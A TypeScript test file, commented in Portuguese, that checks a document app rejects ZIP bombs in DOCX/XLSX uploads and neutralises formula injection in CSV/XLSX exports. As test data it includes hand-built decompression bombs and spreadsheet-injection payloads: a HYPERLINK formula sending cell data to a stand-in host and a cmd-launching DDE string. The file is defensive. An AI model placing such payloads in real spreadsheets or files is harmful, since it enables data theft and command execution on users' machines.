// Arquivos maliciosos na entrada e na saída: bomba de ZIP em DOCX e XLSX (antes
// do mammoth e do ExcelJS) e injeção de fórmula nas exportações CSV e XLSX.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { deflateRawSync } from 'node:zlib';
import ExcelJS from 'exceljs';
import JSZip from 'jszip';
import { conferirZip, LIMITES_ZIP, ZipRecusado } from '../src/util/zip.ts';
import { readFile } from '../src/blocks/ler.ts';
import { aplicarMapeamento } from '../src/imports/apply.ts';
import { exportSections, type ExportMeta } from '../src/blocks/exportar.ts';
import { parseCsv, toCsv } from '../src/util/csv.ts';
import type { Section } from '../src/blocks/types.ts';
import { docx, inputFile, testEnv, xlsx } from './fixtures.ts';

const OPTS = { paginasMax: 20, ocrMinConfidence: 70, visionFallback: false };
const MB = 1024 * 1024;

// ZIP montado à mão: uma entrada deflate que expande para `tamanho` bytes, com o
// tamanho declarado que se quiser (a declaração pode mentir).
function zipComEntrada(nome: string, tamanho: number, declarado = tamanho) {
  const dados = deflateRawSync(Buffer.alloc(tamanho, 0x41));
  const n = Buffer.from(nome);
  const local = Buffer.alloc(30); local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(8, 8);
  local.writeUInt32LE(dados.length, 18); local.writeUInt32LE(declarado, 22); local.writeUInt16LE(n.length, 26);
  const central = Buffer.alloc(46); central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(8, 10);
  central.writeUInt32LE(dados.length, 20); central.writeUInt32LE(declarado, 24); central.writeUInt16LE(n.length, 28); central.writeUInt32LE(0, 42);
  const inicioCentral = local.length + n.length + dados.length;
  const fim = Buffer.alloc(22); fim.writeUInt32LE(0x06054b50, 0); fim.writeUInt16LE(1, 8); fim.writeUInt16LE(1, 10);
  fim.writeUInt32LE(central.length + n.length, 12); fim.writeUInt32LE(inicioCentral, 16);
  return new Uint8Array(Buffer.concat([local, n, dados, central, n, fim]));
}

async function comLimite<T>(totalMb: number, fn: () => Promise<T>) {
  const antes = { ...LIMITES_ZIP };
  LIMITES_ZIP.totalMb = totalMb;
  try { return await fn(); } finally { Object.assign(LIMITES_ZIP, antes); }
}

test('ZIP: documento normal passa; expansão acima do teto é recusada, mesmo com tamanho declarado falso', async () => {
  const ok = conferirZip(await docx(['Contrato de prestação de serviços.']));
  assert.ok(ok.entradas > 3 && ok.descompactado > 0);
  assert.throws(() => conferirZip(zipComEntrada('word/document.xml', 3 * MB), { totalMb: 1, entradas: 10 }), /expande para mais de 1 MB/);
  // Declara 100 bytes, expande para 3 MB: o que vale é o que sai da descompactação.
  assert.throws(() => conferirZip(zipComEntrada('word/document.xml', 3 * MB, 100), { totalMb: 1, entradas: 10 }), ZipRecusado);
  assert.doesNotThrow(() => conferirZip(zipComEntrada('word/document.xml', MB / 2), { totalMb: 1, entradas: 10 }));
});

test('ZIP: entradas demais, ZIP64 e arquivo corrompido são recusados', async () => {
  const z = new JSZip();
  for (let i = 0; i < 12; i++) z.file(`x${i}.xml`, 'a');
  const muitas = new Uint8Array(await z.generateAsync({ type: 'uint8array' }));
  assert.throws(() => conferirZip(muitas, { totalMb: 1, entradas: 10 }), /12 entradas/);
  const zip64 = zipComEntrada('a.xml', 10);
  Buffer.from(zip64.buffer).writeUInt32LE(0xffffffff, zip64.length - 6);
  assert.throws(() => conferirZip(zip64), /ZIP64/);
  assert.throws(() => conferirZip(new TextEncoder().encode('PK não é zip')), /inválido/);
});

test('DOCX e XLSX que expandem demais não chegam ao mammoth nem ao ExcelJS: aviso, sem texto', async () => {
  await comLimite(1, async () => {
    // DOCX com document.xml de 3 MB (detectado pelo conteúdo: ZIP com word/).
    const bomba = zipComEntrada('word/document.xml', 3 * MB);
    const d = await readFile(inputFile('proposta.docx', bomba), OPTS, testEnv().env);
    assert.equal(d.text, '');
    assert.match(d.warnings.join(' '), /arquivo não lido: arquivo compactado expande para mais de 1 MB/);
    // Documento normal continua sendo lido.
    const normal = await readFile(inputFile('proposta.docx', await docx(['Valor total: R$ 10,00'])), OPTS, testEnv().env);
    assert.match(normal.text, /Valor total/);
    // Importação por mapeamento: o XLSX é recusado com o motivo, sem abrir.
    const r = await aplicarMapeamento(zipComEntrada('xl/worksheets/sheet1.xml', 3 * MB), 'pedido.xlsx', { formato: 'xlsx', colunas: [] } as never);
    assert.match(r.erros[0].motivo, /expande para mais de 1 MB/);
  });
  const x = await readFile(inputFile('dados.xlsx', await xlsx({ Plan: [['a', 'b'], [1, 2]] })), OPTS, testEnv().env);
  assert.equal(x.warnings.length, 0);
});

const META: ExportMeta = { runId: '0b9e7c1a-1111-2222-3333-444455556666', assistente: 'Teste', versao: 1, criadoEm: '2026-09-25T10:00:00.000Z',
  revisao: { status: 'aprovado', revisor: 'revisor@exemplo.com.br', em: '2026-09-25T11:00:00.000Z' }, tenant: 'Empresa Exemplo' };
const MALICIOSO = ['=HYPERLINK("http://exemplo.invalid/?d="&A1;"clique")', '+1+cmd|\' /C calc\'!A0', '-2+3', '@SUM(1+1)'];
const secao = (): Section[] => [{ id: 'c', bloco: 'conferir', titulo: 'Nota × pedido', kind: 'divergencias', flags: [], data: {
  rotulos: { esquerda: 'Nota', direita: 'Pedido' }, resumo: { esquerda: 4, direita: 4, pares: 4, divergencias: 4, conferidos: 0 },
  divergencias: MALICIOSO.map((v, i) => ({ chave: v, campo: 'Descrição', regra: 'texto', motivo: 'diferente', esquerda: { valor: v, origem: `nota.xml › item ${i + 1}` }, direita: { valor: 'x', origem: 'pedido.xlsx' } })) } } as Section];

test('CSV: célula que começa com = + - @ vira texto (apóstrofo na frente)', () => {
  const csv = toCsv(MALICIOSO.map(v => ({ valor: v })));
  const linhas = parseCsv(csv.replace(/^\uFEFF/, '')).slice(1).map(r => r[0]);
  assert.deepEqual(linhas, MALICIOSO.map(v => "'" + v));
});

test('XLSX: texto vindo de documento vira célula de texto, nunca fórmula', async () => {
  const f = await exportSections('xlsx', secao(), META);
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(Buffer.from(f.bytes) as unknown as ArrayBuffer);
  const vistos: string[] = [];
  wb.eachSheet(ws => ws.eachRow(row => row.eachCell(c => {
    assert.notEqual(c.type, ExcelJS.ValueType.Formula, `fórmula em ${ws.name}!${c.address}`);
    if (MALICIOSO.includes(String(c.value))) { assert.equal(c.type, ExcelJS.ValueType.String); vistos.push(String(c.value)); }
  })));
  assert.deepEqual([...new Set(vistos)].sort(), [...MALICIOSO].sort());
  // Nenhum <f> (fórmula) no XML das planilhas.
  const z = await JSZip.loadAsync(f.bytes);
  for (const n of Object.keys(z.files).filter(n => /^xl\/worksheets\/.*\.xml$/.test(n))) assert.ok(!/<f[ >]/.test(await z.file(n)!.async('string')), n);
});
